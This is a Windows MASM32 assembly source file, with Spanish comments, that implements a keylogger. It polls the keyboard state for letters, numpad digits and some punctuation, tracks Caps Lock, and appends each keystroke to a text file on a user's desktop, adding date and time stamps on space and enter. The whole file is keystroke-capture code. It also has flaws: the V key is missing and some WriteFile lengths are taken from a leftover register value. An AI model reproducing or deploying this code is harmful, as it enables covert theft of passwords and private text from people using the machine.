.386
.MODEL FLAT, STDCALL
OPTION CASEMAP:NONE
INCLUDE \masm32\include\windows.inc 
INCLUDE \masm32\include\kernel32.inc
INCLUDE \masm32\include\masm32.inc
INCLUDE \masm32\include\masm32rt.inc 
include \masm32\include\user32.inc

includelib \masm32\lib\user32.lib
INCLUDELIB \masm32\lib\kernel32.lib
INCLUDELIB \masm32\lib\masm32.lib

.DATA
	filename BYTE "C:\Users\Carlos\Desktop\Resultado.txt", 0
	ltra BYTE "a",0
	ltrb BYTE "b", 0
	ltrc BYTE "c", 0
	ltrd BYTE "d", 0
	ltre BYTE "e", 0
	ltrf BYTE "f", 0
	ltrg BYTE "g", 0
	ltrh BYTE "h", 0
	ltri BYTE "i", 0
	ltrj BYTE "j", 0
	ltrk BYTE "k", 0
	ltrl BYTE "l", 0
	ltrm BYTE "m", 0
	ltrn BYTE "n", 0
	ltro BYTE "o", 0
	ltrp BYTE "p", 0
	ltrq BYTE "q", 0
	ltrr BYTE "r", 0
	ltrs BYTE "s", 0
	ltrt BYTE "t", 0
	ltru BYTE "u", 0
	ltrv BYTE "v", 0
	ltrw BYTE "w", 0
	ltrx BYTE "x", 0
	ltry BYTE "y", 0
	ltrz BYTE "z", 0
	ltraA BYTE "A", 0
	ltrbB BYTE "B", 0
	ltrcC BYTE "C", 0
	ltrdD BYTE "D", 0
	ltreE BYTE "E", 0
	ltrfF BYTE "F", 0
	ltrgG BYTE "G", 0
	ltrhH BYTE "H", 0
	ltriI BYTE "I", 0
	ltrjJ BYTE "J", 0
	ltrkK BYTE "K", 0
	ltrlL BYTE "L", 0
	ltrmM BYTE "M", 0
	ltrnN BYTE "N", 0
	ltroO BYTE "O", 0
	ltrpP BYTE "P", 0
	ltrqQ BYTE "Q", 0
	ltrrR BYTE "R", 0
	ltrsS BYTE "S", 0
	ltrtT BYTE "T", 0
	ltruU BYTE "U", 0
	ltrvV BYTE "V", 0
	ltrwW BYTE "W", 0
	ltrxX BYTE "X", 0
	ltryY BYTE "Y", 0
	ltrzZ BYTE "Z", 0
	space BYTE " ", 0
	punto BYTE ".", 0
	numerocero BYTE "0",0
	numerouno BYTE "1",0
	numerodos BYTE "2",0
	numerotres BYTE "3",0
	numerocuatro BYTE "4",0
	numerocinco BYTE "5",0
	numeroseis BYTE "6",0
	numerosiete BYTE "7",0
	numeroocho BYTE "8",0
	numeronueve BYTE "9",0
	coma BYTE ",",0
	plus BYTE "+",0
	minus BYTE "-",0
	especial1 BYTE "~",0

	stm  SYSTEMTIME<>
    org stm
	wYear dw 0
	wMonth dw 0
	wToDay dw 0 
	wDay    dw 0
	wHour   dw 0
	wMinute dw 0
	wSecond dw 0
	wKsecond dw 0

	date_buf   db 50 dup (32)
	time_buf   db 20 dup (32)
           db 0
	dateformat db " dddd, MMMM, dd, yyyy", 0
	timeformat db "hh:mm:ss tt",0

	.DATA?
	key DB  ?
	hFile HANDLE ?


.CODE
program:
main PROC

	LOCAl systime:SYSTEMTIME
	INVOKE CreateFile, ADDR filename, GENERIC_READ OR GENERIC_WRITE, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL
	MOV hFile,eax

Loopa:
	.While 1
	
	invoke GetAsyncKeyState, VK_A
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltraA
			invoke WriteFile,hFile,offset ltraA,eax,NULL,NULL
			esperaa:	
			invoke GetKeyState, VK_A
			test ah, ah
			.if Sign?
				jmp esperaa
			.endif
		.else
			INVOKE StdOut, addr ltra
			invoke WriteFile,hFile,offset ltra,eax,NULL,NULL
			invoke GetKeyState, VK_A
			test ah, ah
			.if Sign?
				jmp esperaa
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_B
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrbB
			invoke WriteFile,hFile,offset ltrbB,eax,NULL,NULL
			esperab:	
			invoke GetKeyState, VK_B
			test ah, ah
			.if Sign?
				jmp esperab
			.endif
		.else
			INVOKE StdOut, addr ltrb
			invoke WriteFile,hFile,offset ltrb,eax,NULL,NULL
			invoke GetKeyState, VK_B
			test ah, ah
			.if Sign?
				jmp esperab
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_C
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrcC
			invoke WriteFile,hFile,offset ltrcC,eax,NULL,NULL
			esperac:	
			invoke GetKeyState, VK_C
			test ah, ah
			.if Sign?
				jmp esperac
			.endif
		.else
			INVOKE StdOut, addr ltrc
			invoke WriteFile,hFile,offset ltrc,eax,NULL,NULL
			invoke GetKeyState, VK_C
			test ah, ah
			.if Sign?
				jmp esperac
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_D
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrdD
			invoke WriteFile,hFile,offset ltrdD,eax,NULL,NULL
			esperad:	
			invoke GetKeyState, VK_D
			test ah, ah
			.if Sign?
				jmp esperad
			.endif
		.else
			INVOKE StdOut, addr ltrd
			invoke WriteFile,hFile,offset ltrd,eax,NULL,NULL
			invoke GetKeyState, VK_D
			test ah, ah
			.if Sign?
				jmp esperad
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_E
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltreE
			invoke WriteFile,hFile,offset ltreE,eax,NULL,NULL
			esperae:	
			invoke GetKeyState, VK_E
			test ah, ah
			.if Sign?
				jmp esperae
			.endif
		.else
			INVOKE StdOut, addr ltre
			invoke WriteFile,hFile,offset ltre,eax,NULL,NULL
			invoke GetKeyState, VK_E
			test ah, ah
			.if Sign?
				jmp esperae
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_F
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrfF
			invoke WriteFile,hFile,offset ltrfF,eax,NULL,NULL
			esperaf:	
			invoke GetKeyState, VK_F
			test ah, ah
			.if Sign?
				jmp esperaf
			.endif
		.else
			INVOKE StdOut, addr ltrf
			invoke WriteFile,hFile,offset ltrf,eax,NULL,NULL
			invoke GetKeyState, VK_F
			test ah, ah
			.if Sign?
				jmp esperaf
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_G
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrgG
			invoke WriteFile,hFile,offset ltrgG,eax,NULL,NULL
			esperag:	
			invoke GetKeyState, VK_G
			test ah, ah
			.if Sign?
				jmp esperag
			.endif
		.else
			INVOKE StdOut, addr ltrg
			invoke WriteFile,hFile,offset ltrg,eax,NULL,NULL
			invoke GetKeyState, VK_G
			test ah, ah
			.if Sign?
				jmp esperag
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_H
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrhH
			invoke WriteFile,hFile,offset ltrhH,eax,NULL,NULL
			esperah:	
			invoke GetKeyState, VK_H
			test ah, ah
			.if Sign?
				jmp esperah
			.endif
		.else
			INVOKE StdOut, addr ltrh
			invoke WriteFile,hFile,offset ltrh,eax,NULL,NULL
			invoke GetKeyState, VK_H
			test ah, ah
			.if Sign?
				jmp esperah
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_I
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltriI
			invoke WriteFile,hFile,offset ltriI,eax,NULL,NULL
			esperai:	
			invoke GetKeyState, VK_I
			test ah, ah
			.if Sign?
				jmp esperai
			.endif
		.else
			INVOKE StdOut, addr ltri
			invoke WriteFile,hFile,offset ltri,eax,NULL,NULL
			invoke GetKeyState, VK_I
			test ah, ah
			.if Sign?
				jmp esperai
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_J
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrjJ
			invoke WriteFile,hFile,offset ltrjJ,eax,NULL,NULL
			esperaj:	
			invoke GetKeyState, VK_J
			test ah, ah
			.if Sign?
				jmp esperaj
			.endif
		.else
			INVOKE StdOut, addr ltrj
			invoke WriteFile,hFile,offset ltrj,eax,NULL,NULL
			invoke GetKeyState, VK_J
			test ah, ah
			.if Sign?
				jmp esperaj
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_K
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrkK
			invoke WriteFile,hFile,offset ltrkK,eax,NULL,NULL
			esperak:	
			invoke GetKeyState, VK_K
			test ah, ah
			.if Sign?
				jmp esperak
			.endif
		.else
			INVOKE StdOut, addr ltrk
			invoke WriteFile,hFile,offset ltrk,eax,NULL,NULL
			invoke GetKeyState, VK_K
			test ah, ah
			.if Sign?
				jmp esperak
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_L
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrlL
			invoke WriteFile,hFile,offset ltrlL,eax,NULL,NULL
			esperal:	
			invoke GetKeyState, VK_L
			test ah, ah
			.if Sign?
				jmp esperal
			.endif
		.else
			INVOKE StdOut, addr ltrl
			invoke WriteFile,hFile,offset ltrl,eax,NULL,NULL
			invoke GetKeyState, VK_L
			test ah, ah
			.if Sign?
				jmp esperal
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_M
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrmM
			invoke WriteFile,hFile,offset ltrmM,eax,NULL,NULL
			esperam:	
			invoke GetKeyState, VK_M
			test ah, ah
			.if Sign?
				jmp esperam
			.endif
		.else
			INVOKE StdOut, addr ltrm
			invoke WriteFile,hFile,offset ltrm,eax,NULL,NULL
			invoke GetKeyState, VK_M
			test ah, ah
			.if Sign?
				jmp esperam
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_N
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrnN
			invoke WriteFile,hFile,offset ltrnN,eax,NULL,NULL
			esperan:	
			invoke GetKeyState, VK_N
			test ah, ah
			.if Sign?
				jmp esperan
			.endif
		.else
			INVOKE StdOut, addr ltrn
			invoke WriteFile,hFile,offset ltrn,eax,NULL,NULL
			invoke GetKeyState, VK_N
			test ah, ah
			.if Sign?
				jmp esperan
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_O
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltroO
			invoke WriteFile,hFile,offset ltroO,eax,NULL,NULL
			esperao:	
			invoke GetKeyState, VK_O
			test ah, ah
			.if Sign?
				jmp esperao
			.endif
		.else
			INVOKE StdOut, addr ltro
			invoke WriteFile,hFile,offset ltro,eax,NULL,NULL
			invoke GetKeyState, VK_O
			test ah, ah
			.if Sign?
				jmp esperao
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_P
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrpP
			invoke WriteFile,hFile,offset ltrpP,eax,NULL,NULL
			esperap:	
			invoke GetKeyState, VK_P
			test ah, ah
			.if Sign?
				jmp esperap
			.endif
		.else
			INVOKE StdOut, addr ltrp
			invoke WriteFile,hFile,offset ltrp,eax,NULL,NULL
			invoke GetKeyState, VK_P
			test ah, ah
			.if Sign?
				jmp esperap
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_Q
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrqQ
			invoke WriteFile,hFile,offset ltrqQ,eax,NULL,NULL
			esperaq:	
			invoke GetKeyState, VK_Q
			test ah, ah
			.if Sign?
				jmp esperaq
			.endif
		.else
			INVOKE StdOut, addr ltrq
			invoke WriteFile,hFile,offset ltrq,eax,NULL,NULL
			invoke GetKeyState, VK_Q
			test ah, ah
			.if Sign?
				jmp esperaq
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_R
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrrR
			invoke WriteFile,hFile,offset ltrrR,eax,NULL,NULL
			esperar:	
			invoke GetKeyState, VK_R
			test ah, ah
			.if Sign?
				jmp esperar
			.endif
		.else
			INVOKE StdOut, addr ltrr
			invoke WriteFile,hFile,offset ltrr,eax,NULL,NULL
			invoke GetKeyState, VK_R
			test ah, ah
			.if Sign?
				jmp esperar
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_S
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrsS
			invoke WriteFile,hFile,offset ltrsS,eax,NULL,NULL
			esperas:	
			invoke GetKeyState, VK_S
			test ah, ah
			.if Sign?
				jmp esperas
			.endif
		.else
			INVOKE StdOut, addr ltrs
			invoke WriteFile,hFile,offset ltrs,eax,NULL,NULL
			invoke GetKeyState, VK_S
			test ah, ah
			.if Sign?
				jmp esperas
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_T
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrtT
			invoke WriteFile,hFile,offset ltrtT,eax,NULL,NULL
			esperat:	
			invoke GetKeyState, VK_T
			test ah, ah
			.if Sign?
				jmp esperat
			.endif
		.else
			INVOKE StdOut, addr ltrt
			invoke WriteFile,hFile,offset ltrt,eax,NULL,NULL
			invoke GetKeyState, VK_T
			test ah, ah
			.if Sign?
				jmp esperat
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_U
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltruU
			invoke WriteFile,hFile,offset ltruU,eax,NULL,NULL
			esperau:	
			invoke GetKeyState, VK_U
			test ah, ah
			.if Sign?
				jmp esperau
			.endif
		.else
			INVOKE StdOut, addr ltru
			invoke WriteFile,hFile,offset ltru,eax,NULL,NULL
			invoke GetKeyState, VK_U
			test ah, ah
			.if Sign?
				jmp esperau
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_W
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrwW
			invoke WriteFile,hFile,offset ltrwW,eax,NULL,NULL
			esperaw:	
			invoke GetKeyState, VK_W
			test ah, ah
			.if Sign?
				jmp esperaw
			.endif
		.else
			INVOKE StdOut, addr ltrw
			invoke WriteFile,hFile,offset ltrw,eax,NULL,NULL
			invoke GetKeyState, VK_W
			test ah, ah
			.if Sign?
				jmp esperaw
			.endif
		.endif
		jmp Loopa
	.endif 
		

	invoke GetAsyncKeyState, VK_X
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrxX
			invoke WriteFile,hFile,offset ltrxX,eax,NULL,NULL
			esperax:	
			invoke GetKeyState, VK_X
			test ah, ah
			.if Sign?
				jmp esperax
			.endif
		.else
			INVOKE StdOut, addr ltrx
			invoke WriteFile,hFile,offset ltrx,eax,NULL,NULL
			invoke GetKeyState, VK_X
			test ah, ah
			.if Sign?
				jmp esperax
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetAsyncKeyState, VK_Y
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltryY
			invoke WriteFile,hFile,offset ltryY,eax,NULL,NULL
			esperay:	
			invoke GetKeyState, VK_Y
			test ah, ah
			.if Sign?
				jmp esperay
			.endif
		.else
			INVOKE StdOut, addr ltry
			invoke WriteFile,hFile,offset ltry,eax,NULL,NULL
			invoke GetKeyState, VK_Y
			test ah, ah
			.if Sign?
				jmp esperay
			.endif
		.endif
		jmp Loopa
	.endif

	invoke GetKeyState, VK_Z
	test ah, ah
	.if Sign?
		invoke GetKeyState, VK_CAPITAL								;Mayuscula
		test al, 1
		.if !Zero?
			INVOKE StdOut, addr ltrzZ								;Mayuscula esta activada
			INVOKE WriteFile,hFile,offset ltrzZ,eax,NULL,NULL
			esperaz:	
			invoke GetKeyState, VK_Z
			test ah, ah
			.if Sign?
				jmp esperaz
			.endif
		.else
			INVOKE StdOut, addr ltrz
			INVOKE WriteFile,hFile,offset ltrz,eax,NULL,NULL	
			invoke GetKeyState, VK_Z
			test ah, ah
			.if Sign?
				jmp esperaz
			.endif
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_SPACE
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr space
		INVOKE WriteFile,hFile,offset space,eax,NULL,NULL
		
		
INVOKE   GetLocalTime, ADDR stm
	    INVOKE   GetDateFormat, 0, 0, \
        ADDR stm, ADDR dateformat, ADDR date_buf, 50
		INVOKE   GetDateFormat, 0, 0, \
            0, ADDR dateformat, ADDR date_buf, 50
		MOV   ecx, offset date_buf
		ADD   ecx, eax
		MOV   byte ptr [ecx-1], " " 
		INVOKE   GetTimeFormat, 0, 0, \
            0, ADDR timeformat, ecx, 20
 
	    INVOKE StdOut, ADDR date_buf
		INVOKE WriteFile, hFile, OFFSET date_buf, EAX, NULL, NULL
		INVOKE StdOut, ADDR space
		INVOKE WriteFile, hFile, OFFSET space, EAX, NULL, NULL

		espacio:	
		invoke GetKeyState, VK_SPACE
		test ah, ah
		.if Sign?
			jmp espacio
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_RETURN
	test ah, ah
	.if Sign?
		
		INVOKE   GetLocalTime, ADDR stm
	    INVOKE   GetDateFormat, 0, 0, \
        ADDR stm, ADDR dateformat, ADDR date_buf, 50
		INVOKE   GetDateFormat, 0, 0, \
            0, ADDR dateformat, ADDR date_buf, 50
		MOV   ecx, offset date_buf
		ADD   ecx, eax
		MOV   byte ptr [ecx-1], " " 
		INVOKE   GetTimeFormat, 0, 0, \
            0, ADDR timeformat, ecx, 20
 
	    INVOKE StdOut, ADDR date_buf
		INVOKE WriteFile, hFile, OFFSET date_buf, EAX, NULL, NULL
		INVOKE StdOut, ADDR space
		INVOKE WriteFile, hFile, OFFSET space, EAX, NULL, NULL

		enter_:	
		invoke GetKeyState, VK_RETURN
		test ah, ah
		.if Sign?
			jmp enter_
		.endif
		jmp Loopa		
	.endif

	;VK_OEM_PERIOD
	invoke GetKeyState, VK_OEM_PERIOD
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr punto
		INVOKE WriteFile,hFile,offset punto,eax,NULL,NULL			
		puntoS:	
		invoke GetKeyState, VK_OEM_PERIOD
		test ah, ah
		.if Sign?
			jmp puntoS
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_NUMPAD0
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr numerocero
		INVOKE WriteFile,hFile,offset numerocero,eax,NULL,NULL			
		numcero:	
		invoke GetKeyState, VK_NUMPAD0
		test ah, ah
		.if Sign?
			jmp numcero
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_NUMPAD1
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr numerouno
		INVOKE WriteFile,hFile,offset numerouno,eax,NULL,NULL			
		numuno:	
		invoke GetKeyState, VK_NUMPAD1
		test ah, ah
		.if Sign?
			jmp numuno
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_NUMPAD2
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr numerodos
		INVOKE WriteFile,hFile,offset numerodos,eax,NULL,NULL			
		numdos:	
		invoke GetKeyState, VK_NUMPAD2
		test ah, ah
		.if Sign?
			jmp numdos
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_NUMPAD3
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr numerotres
		INVOKE WriteFile,hFile,offset numerotres,eax,NULL,NULL			
		numtres:	
		invoke GetKeyState, VK_NUMPAD3
		test ah, ah
		.if Sign?
			jmp numtres
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_NUMPAD4
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr numerocuatro
		INVOKE WriteFile,hFile,offset numerocuatro,eax,NULL,NULL			
		numcuatro:	
		invoke GetKeyState, VK_NUMPAD4
		test ah, ah
		.if Sign?
			jmp numcuatro
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_NUMPAD5
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr numerocinco
		INVOKE WriteFile,hFile,offset numerocinco,eax,NULL,NULL			
		numcinco:	
		invoke GetKeyState, VK_NUMPAD5
		test ah, ah
		.if Sign?
			jmp numcinco
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_NUMPAD6
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr numeroseis
		INVOKE WriteFile,hFile,offset numeroseis,eax,NULL,NULL			
		numseis:	
		invoke GetKeyState, VK_NUMPAD6
		test ah, ah
		.if Sign?
			jmp numseis
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_NUMPAD7
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr numerosiete
		INVOKE WriteFile,hFile,offset numerosiete,eax,NULL,NULL			
		numsiete:	
		invoke GetKeyState, VK_NUMPAD7
		test ah, ah
		.if Sign?
			jmp numsiete
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_NUMPAD8
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr numeroocho
		INVOKE WriteFile,hFile,offset numeroocho,eax,NULL,NULL			
		numocho:	
		invoke GetKeyState, VK_NUMPAD8
		test ah, ah
		.if Sign?
			jmp numocho
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_NUMPAD9
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr numeronueve
		INVOKE WriteFile,hFile,offset numeronueve,eax,NULL,NULL			
		numnueve:	
		invoke GetKeyState, VK_NUMPAD9
		test ah, ah
		.if Sign?
			jmp numnueve
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_OEM_PLUS
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr plus
		INVOKE WriteFile,hFile,offset plus,eax,NULL,NULL			
		plusciclo:	
		invoke GetKeyState, VK_OEM_PLUS
		test ah, ah
		.if Sign?
			jmp plusciclo
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_OEM_COMMA
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr coma
		INVOKE WriteFile,hFile,offset coma,eax,NULL,NULL			
		comaciclo:	
		invoke GetKeyState, VK_OEM_COMMA
		test ah, ah
		.if Sign?
			jmp comaciclo
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_OEM_MINUS
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr minus
		INVOKE WriteFile,hFile,offset minus,eax,NULL,NULL			
		minusciclo:	
		invoke GetKeyState, VK_OEM_MINUS
		test ah, ah
		.if Sign?
			jmp minusciclo
		.endif
		jmp Loopa		
	.endif

	invoke GetKeyState, VK_OEM_3
	test ah, ah
	.if Sign?
		INVOKE StdOut, addr especial1
		INVOKE WriteFile,hFile,offset especial1,eax,NULL,NULL			
		especial1ciclo:	
		invoke GetKeyState, VK_OEM_3
		test ah, ah
		.if Sign?
			jmp especial1ciclo
		.endif
		jmp Loopa		
	.endif

  .Endw
main ENDP
END program